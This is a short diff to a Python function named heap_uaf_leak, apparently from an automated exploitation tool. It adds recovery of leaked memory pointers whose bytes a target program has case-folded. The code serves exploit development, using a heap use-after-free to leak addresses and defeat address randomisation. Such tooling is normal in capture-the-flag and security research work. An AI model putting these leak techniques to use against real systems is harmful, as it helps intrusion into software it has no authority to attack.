@@ -264,6 +264,11 @@ def heap_uaf_leak(workdir: Path, exe: Path, ops: dict, model: dict, width, *, ta
         vals += _leak._le_pointer_words(out)
         vals += [int.from_bytes(out[i:i + 6], "little") for i in range(len(out) - 5)
                  if out[i + 5] == 0x7F]
+        # A viewer that CASE-FOLDS its output (toupper/tolower/"funkify") mangles a leaked pointer's
+        # letter bytes and can lowercase the image top byte 0x55/0x56 to 0x75/0x76; recover the
+        # un-folded candidates too. The page-alignment guard below and classify_leak's corroboration
+        # drop the bogus case-variants, so adding them only RESCUES a transformed leak, never fabricates.
+        vals += _leak._case_fold_pointer_candidates(out)
         if unsorted_off:
             for v in vals:
                 if 0x7f0000000000 <= v < 0x800000000000:
